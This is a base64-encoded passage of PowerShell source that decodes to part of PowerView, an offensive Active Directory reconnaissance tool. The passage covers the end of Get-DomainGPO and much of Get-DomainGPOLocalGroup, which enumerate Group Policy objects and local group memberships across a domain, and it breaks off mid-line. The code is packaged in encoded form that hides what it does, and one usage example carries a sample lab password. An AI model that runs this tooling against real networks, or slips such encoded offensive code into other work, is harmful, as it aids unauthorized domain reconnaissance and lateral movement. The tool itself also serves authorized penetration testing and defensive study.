QogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyID0gJycKICAgICAgICAgICAgICAgICRGaWx0ZXIgPSAnJwogICAgICAgICAgICAgICAgJElkZW50aXR5IHwgV2hlcmUtT2JqZWN0IHskX30gfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5SW5zdGFuY2UgPSAkXy5SZXBsYWNlKCcoJywgJ1wyOCcpLlJlcGxhY2UoJyknLCAnXDI5JykKICAgICAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5SW5zdGFuY2UgLW1hdGNoICdMREFQOi8vfF5DTj0uKicpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIoZGlzdGluZ3Vpc2hlZG5hbWU9JElkZW50aXR5SW5zdGFuY2UpIgogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKC1ub3QgJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgLWFuZCAoLW5vdCAkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgaWYgYSAtRG9tYWluIGlzbid0IGV4cGxpY2l0bHkgc2V0LCBleHRyYWN0IHRoZSBvYmplY3QgZG9tYWluIG91dCBvZiB0aGUgZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgICBhbmQgcmVidWlsZCB0aGUgZG9tYWluIHNlYXJjaGVyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlEb21haW4gPSAkSWRlbnRpdHlJbnN0YW5jZS5TdWJTdHJpbmcoJElkZW50aXR5SW5zdGFuY2UuSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPXSBFeHRyYWN0ZWQgZG9tYWluICckSWRlbnRpdHlEb21haW4nIGZyb20gJyRJZGVudGl0eUluc3RhbmNlJyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkSWRlbnRpdHlEb21haW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE9TZWFyY2hlciA9IEdldC1Eb21haW5TZWFyY2hlciBAU2VhcmNoZXJBcmd1bWVudHMKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgtbm90ICRHUE9TZWFyY2hlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtRG9tYWluR1BPXSBVbmFibGUgdG8gcmV0cmlldmUgZG9tYWluIHNlYXJjaGVyIGZvciAnJElkZW50aXR5RG9tYWluJyIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlaWYgKCRJZGVudGl0eUluc3RhbmNlIC1tYXRjaCAney4qfScpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJElkZW50aXR5RmlsdGVyICs9ICIobmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEd1aWRCeXRlU3RyaW5nID0gKC1Kb2luICgoW0d1aWRdJElkZW50aXR5SW5zdGFuY2UpLlRvQnl0ZUFycmF5KCkgfCBGb3JFYWNoLU9iamVjdCB7JF8uVG9TdHJpbmcoJ1gnKS5QYWRMZWZ0KDIsJzAnKX0pKSAtUmVwbGFjZSAnKC4uKScsJ1wkMScKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRJZGVudGl0eUZpbHRlciArPSAiKG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKSIKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkSWRlbnRpdHlGaWx0ZXIgKz0gIihkaXNwbGF5bmFtZT0kSWRlbnRpdHlJbnN0YW5jZSkiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJElkZW50aXR5RmlsdGVyIC1hbmQgKCRJZGVudGl0eUZpbHRlci5UcmltKCkgLW5lICcnKSApIHsKICAgICAgICAgICAgICAgICAgICAkRmlsdGVyICs9ICIofCRJZGVudGl0eUZpbHRlcikiCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9dIFVzaW5nIGFkZGl0aW9uYWwgTERBUCBmaWx0ZXI6ICRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgICAgICRGaWx0ZXIgKz0gIiRMREFQRmlsdGVyIgogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICRHUE9TZWFyY2hlci5maWx0ZXIgPSAiKCYob2JqZWN0Q2F0ZWdvcnk9Z3JvdXBQb2xpY3lDb250YWluZXIpJEZpbHRlcikiCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT10gZmlsdGVyIHN0cmluZzogJCgkR1BPU2VhcmNoZXIuZmlsdGVyKSIKCiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydGaW5kT25lJ10pIHsgJFJlc3VsdHMgPSAkR1BPU2VhcmNoZXIuRmluZE9uZSgpIH0KICAgICAgICAgICAgICAgIGVsc2UgeyAkUmVzdWx0cyA9ICRHUE9TZWFyY2hlci5GaW5kQWxsKCkgfQogICAgICAgICAgICAgICAgJFJlc3VsdHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSYXcnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAjIHJldHVybiByYXcgcmVzdWx0IG9iamVjdHMKICAgICAgICAgICAgICAgICAgICAgICAgJEdQTyA9ICRfCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE8uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkdQTy5SYXcnKQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoQmFzZSddIC1hbmQgKCRTZWFyY2hCYXNlIC1NYXRjaCAnXkdDOi8vJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE8gPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE9ETiA9ICRHUE8uZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR1BPRG9tYWluID0gJEdQT0ROLlN1YlN0cmluZygkR1BPRE4uSW5kZXhPZignREM9JykpIC1yZXBsYWNlICdEQz0nLCcnIC1yZXBsYWNlICcsJywnLicKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkZ3BjZmlsZXN5c3BhdGggPSAiXFwkR1BPRG9tYWluXFN5c1ZvbFwkR1BPRG9tYWluXFBvbGljaWVzXCQoJEdQTy5jbikiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEdQTyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdncGNmaWxlc3lzcGF0aCcgJGdwY2ZpbGVzeXNwYXRoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9dIEVycm9yIGNhbGN1bGF0aW5nIGdwY2ZpbGVzeXNwYXRoIGZvcjogJCgkR1BPLmRpc3Rpbmd1aXNoZWRuYW1lKSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHUE8gPSBDb252ZXJ0LUxEQVBQcm9wZXJ0eSAtUHJvcGVydGllcyAkXy5Qcm9wZXJ0aWVzCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgJEdQTy5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuR1BPJykKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJEdQTwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRSZXN1bHRzKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsgJFJlc3VsdHMuZGlzcG9zZSgpIH0KICAgICAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPXSBFcnJvciBkaXNwb3Npbmcgb2YgdGhlIFJlc3VsdHMgb2JqZWN0OiAkXyIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkR1BPU2VhcmNoZXIuZGlzcG9zZSgpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBHZXQtRG9tYWluR1BPTG9jYWxHcm91cCB7CjwjCi5TWU5PUFNJUwoKUmV0dXJucyBhbGwgR1BPcyBpbiBhIGRvbWFpbiB0aGF0IG1vZGlmeSBsb2NhbCBncm91cCBtZW1iZXJzaGlwcyB0aHJvdWdoICdSZXN0cmljdGVkIEdyb3VwcycKb3IgR3JvdXAgUG9saWN5IHByZWZlcmVuY2VzLiBBbHNvIHJldHVybiB0aGVpciB1c2VyIG1lbWJlcnNoaXAgbWFwcGluZ3MsIGlmIHRoZXkgZXhpc3QuCgpBdXRob3I6IEBoYXJtajB5ICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluR1BPLCBHZXQtR3B0VG1wbCwgR2V0LUdyb3Vwc1hNTCwgQ29udmVydFRvLVNJRCwgQ29udmVydEZyb20tU0lEICAKCi5ERVNDUklQVElPTgoKRmlyc3QgZW51bWVyYXRlcyBhbGwgR1BPcyBpbiB0aGUgY3VycmVudC90YXJnZXQgZG9tYWluIHVzaW5nIEdldC1Eb21haW5HUE8gd2l0aCBwYXNzZWQKYXJndW1lbnRzLCBhbmQgZm9yIGVhY2ggR1BPIGNoZWNrcyBpZiAnUmVzdHJpY3RlZCBHcm91cHMnIGFyZSBzZXQgd2l0aCBHcHRUbXBsLmluZiBvcgpncm91cCBtZW1iZXJzaGlwIGlzIHNldCB0aHJvdWdoIEdyb3VwIFBvbGljeSBQcmVmZXJlbmNlcyBncm91cHMueG1sIGZpbGVzLiBGb3IgYW55CkdwdFRtcGwuaW5mIGZpbGVzIGZvdW5kLCB0aGUgZmlsZSBpcyBwYXJzZWQgd2l0aCBHZXQtR3B0VG1wbCBhbmQgYW55ICdHcm91cCBNZW1iZXJzaGlwJwpzZWN0aW9uIGRhdGEgaXMgcHJvY2Vzc2VkIGlmIHByZXNlbnQuIEFueSBmb3VuZCBHcm91cHMueG1sIGZpbGVzIGFyZSBwYXJzZWQgd2l0aApHZXQtR3JvdXBzWE1MIGFuZCB0aG9zZSBtZW1iZXJzaGlwcyBhcmUgcmV0dXJuZWQgYXMgd2VsbC4KCi5QQVJBTUVURVIgSWRlbnRpdHkKCkEgZGlzcGxheSBuYW1lIChlLmcuICdUZXN0IEdQTycpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiAnQ049e0YyNjBCNzZELTU1QzgtNDZDNS1CRUYxLTkwMTZERDk4RTI3Mn0sQ049UG9saWNpZXMsQ049U3lzdGVtLERDPXRlc3RsYWIsREM9bG9jYWwnKSwKR1VJRCAoZS5nLiAnMTBlYzMyMGQtMzExMS00ZWY0LThmYWYtOGYxNGY0YWRjNzg5JyksIG9yIEdQTyBuYW1lIChlLmcuICd7RjI2MEI3NkQtNTVDOC00NkM1LUJFRjEtOTAxNkREOThFMjcyfScpLiBXaWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIFJlc29sdmVNZW1iZXJzVG9TSURzCgpTd2l0Y2guIEluZGljYXRlcyB0aGF0IGFueSBtZW1iZXIgbmFtZXMgc2hvdWxkIGJlIHJlc29sdmVkIHRvIHRoZWlyIGRvbWFpbiBTSURzLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIHVzZSBmb3IgdGhlIHF1ZXJ5LCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIExEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gZmlsdGVyIEFjdGl2ZSBEaXJlY3Rvcnkgb2JqZWN0cy4KCi5QQVJBTUVURVIgU2VhcmNoQmFzZQoKVGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoLCBlLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiClVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgU2VydmVyCgpTcGVjaWZpZXMgYW4gQWN0aXZlIERpcmVjdG9yeSBzZXJ2ZXIgKGRvbWFpbiBjb250cm9sbGVyKSB0byBiaW5kIHRvLgoKLlBBUkFNRVRFUiBTZWFyY2hTY29wZQoKU3BlY2lmaWVzIHRoZSBzY29wZSB0byBzZWFyY2ggdW5kZXIsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4uCgouRVhBTVBMRQoKR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAKClJldHVybnMgYWxsIGxvY2FsIGdyb3VwcyBzZXQgYnkgR1BPIGFsb25nIHdpdGggdGhlaXIgbWVtYmVycyBhbmQgbWVtYmVyb2YuCgouRVhBTVBMRQoKR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAgLVJlc29sdmVNZW1iZXJzVG9TSURzCgpSZXR1cm5zIGFsbCBsb2NhbCBncm91cHMgc2V0IGJ5IEdQTyBhbG9uZyB3aXRoIHRoZWlyIG1lbWJlcnMgYW5kIG1lbWJlcm9mLAphbmQgcmVzb2x2ZSBhbnkgbWVtYmVycyB0byB0aGVpciBkb21haW4gU0lEcy4KCi5FWEFNUExFCgonezA4NDdDNjE1LTZDNEUtNEQ0NS1BMDY0LTYwMDEwNDBDQzIxQ30nIHwgR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAKClJldHVybiBhbnkgR1BPLXNldCBncm91cHMgZm9yIHRoZSBHUE8gd2l0aCB0aGUgZ2l2ZW4gbmFtZS9HVUlELgoKLkVYQU1QTEUKCkdldC1Eb21haW5HUE9Mb2NhbEdyb3VwICdEZXNrdG9wcycKClJldHVybiBhbnkgR1BPLXNldCBncm91cHMgZm9yIHRoZSBHUE8gd2l0aCB0aGUgZ2l2ZW4gZGlzcGxheSBuYW1lLgoKLkVYQU1QTEUKCiRTZWNQYXNzd29yZCA9IENvbnZlcnRUby1TZWN1cmVTdHJpbmcgJ1Bhc3N3b3JkMTIzIScgLUFzUGxhaW5UZXh0IC1Gb3JjZQokQ3JlZCA9IE5ldy1PYmplY3QgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWwoJ1RFU1RMQUJcZGZtLmEnLCAkU2VjUGFzc3dvcmQpCkdldC1Eb21haW5HUE9Mb2NhbEdyb3VwIC1DcmVkZW50aWFsICRDcmVkCgouTElOSwoKaHR0cHM6Ly9tb3JnYW5zaW1vbnNlbmJsb2cuYXp1cmV3ZWJzaXRlcy5uZXQvdGFnL2dyb3Vwcy8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5HUE9Hcm91cCcpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnRGlzdGluZ3Vpc2hlZE5hbWUnLCAnU2FtQWNjb3VudE5hbWUnLCAnTmFtZScpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkSWRlbnRpdHksCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFJlc29sdmVNZW1iZXJzVG9TSURzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0ZpbHRlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJExEQVBGaWx0ZXIsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0RvbWFpbkNvbnRyb2xsZXInKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2ZXIsCgogICAgICAgIFtWYWxpZGF0ZVNldCgnQmFzZScsICdPbmVMZXZlbCcsICdTdWJ0cmVlJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoU2NvcGUgPSAnU3VidHJlZScsCgogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMDAwKV0KICAgICAgICBbSW50XQogICAgICAgICRSZXN1bHRQYWdlU2l6ZSA9IDIwMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFNlcnZlclRpbWVMaW1pdCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgJFNlYXJjaGVyQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydEb21haW4nXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0xEQVBGaWx0ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0xEQVBGaWx0ZXInXSA9ICREb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2UnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRTZWFyY2hCYXNlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaFNjb3BlJ10gPSAkU2VhcmNoU2NvcGUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFNlYXJjaGVyQXJndW1lbnRzWydUb21ic3RvbmUnXSA9ICRUb21ic3RvbmUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkU2VhcmNoZXJBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJENvbnZlcnRBcmd1bWVudHMgPSBAe30KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgeyAkQ29udmVydEFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQ29udmVydEFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJENvbnZlcnRBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KCiAgICAgICAgJFNwbGl0T3B0aW9uID0gW1N5c3RlbS5TdHJpbmdTcGxpdE9wdGlvbnNdOjpSZW1vdmVFbXB0eUVudHJpZXMKICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7ICRTZWFyY2hlckFyZ3VtZW50c1snSWRlbnRpdHknXSA9ICRJZGVudGl0eSB9CgogICAgICAgIEdldC1Eb21haW5HUE8gQFNlYXJjaGVyQXJndW1lbnRzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkR1BPZGlzcGxheU5hbWUgPSAkXy5kaXNwbGF5bmFtZQogICAgICAgICAgICAkR1BPbmFtZSA9ICRfLm5hbWUKICAgICAgICAgICAgJEdQT1BhdGggPSAkXy5ncGNmaWxlc3lzcGF0aAoKICAgICAgICAgICAgJFBhcnNlQXJncyA9ICBAeyAnR3B0VG1wbFBhdGgnID0gIiRHUE9QYXRoXE1BQ0hJTkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcU2VjRWRpdFxHcHRUbXBsLmluZiIgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFBhcnNlQXJnc1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICAgICAgIyBmaXJzdCBwYXJzZSB0aGUgJ1Jlc3RyaWN0ZWQgR3JvdXBzJyBmaWxlIChHcHRUbXBsLmluZikgaWYgaXQgZXhpc3RzCiAgICAgICAgICAgICRJbmYgPSBHZXQtR3B0VG1wbCBAUGFyc2VBcmdzCgogICAgICAgICAgICBpZiAoJEluZiAtYW5kICgkSW5mLnBzYmFzZS5LZXlzIC1jb250YWlucyAnR3JvdXAgTWVtYmVyc2hpcCcpKSB7CiAgICAgICAgICAgICAgICAkTWVtYmVyc2hpcHMgPSBAe30KCiAgICAgICAgICAgICAgICAjIHBhcnNlIHRoZSBtZW1iZXJzL21lbWJlcm9mIGZpZWxkcyBmb3IgZWFjaCBlbnRyeQogICAgICAgICAgICAgICAgRm9yRWFjaCAoJE1lbWJlcnNoaXAgaW4gJEluZi4nR3JvdXAgTWVtYmVyc2hpcCcuR2V0RW51bWVyYXRvcigpKSB7CiAgICAgICAgICAgICAgICAgICAgJEdyb3VwLCAkUmVsYXRpb24gPSAkTWVtYmVyc2hpcC5LZXkuU3BsaXQoJ19fJywgJFNwbGl0T3B0aW9uKSB8IEZvckVhY2gtT2JqZWN0IHskXy5UcmltKCl9CiAgICAgICAgICAgICAgICAgICAgIyBleHRyYWN0IG91dCBBTEwgbWVtYmVycwogICAgICAgICAgICAgICAgICAgICRNZW1iZXJzaGlwVmFsdWUgPSAkTWVtYmVyc2hpcC5WYWx1ZSB8IFdoZXJlLU9iamVjdCB7JF99IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5UcmltKCcqJykgfSB8IFdoZXJlLU9iamVjdCB7JF99CgogICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc29sdmVNZW1iZXJzVG9TSURzJ10pIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiB0aGUgcmVzdWx0aW5nIG1lbWJlciBpcyB1c2VybmFtZSBhbmQgbm90IGEgU0lELCBhdHRlbXB0IHRvIHJlc29sdmUgaXQKICAgICAgICAgICAgICAgICAgICAgICAgJEdyb3VwTWVtYmVycyA9IEAoKQogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkTWVtYmVyIGluICRNZW1iZXJzaGlwVmFsdWUpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyIC1hbmQgKCRNZW1iZXIuVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoJE1lbWJlciAtbm90bWF0Y2ggJ15TLTEtLionKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRDb252ZXJ0VG9Bcmd1bWVudHMgPSBAeydPYmplY3ROYW1lJyA9ICRNZW1iZXJ9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0RvbWFpbiddKSB7ICRDb252ZXJ0VG9Bcmd1bWVudHNbJ0RvbWFpbiddID0gJERvbWFpbiB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJTSUQgPSBDb252ZXJ0VG8tU0lEIEBDb252ZXJ0VG9Bcmd1bWVudHMKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkTWVtYmVyU0lEKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBNZW1iZXJzICs9ICRNZW1iZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cE1lbWJlcnMgKz0gJE1lbWJlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgI